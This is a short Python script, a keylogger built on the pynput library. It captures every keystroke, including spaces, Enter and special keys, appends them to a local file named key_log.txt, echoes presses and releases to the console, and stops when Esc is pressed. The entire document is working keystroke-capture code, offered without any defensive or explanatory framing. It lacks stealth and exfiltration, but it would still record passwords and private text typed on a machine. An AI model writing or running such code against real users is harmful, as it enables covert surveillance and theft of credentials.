from pynput import keyboard

# File where logs will be stored
log_file = "key_log.txt"

print("Keylogger started")

def on_press(key):
    print(f"Key pressed: {key}")
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        if key == key.space:
            with open(log_file, "a") as file:
                file.write(" ")
        elif key == key.enter:
            with open(log_file, "a") as file:
                file.write("\n")
        else:
            with open(log_file, "a") as file:
                file.write(f" [{key}] ")

def on_release(key):
    print(f"Key released: {key}")
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
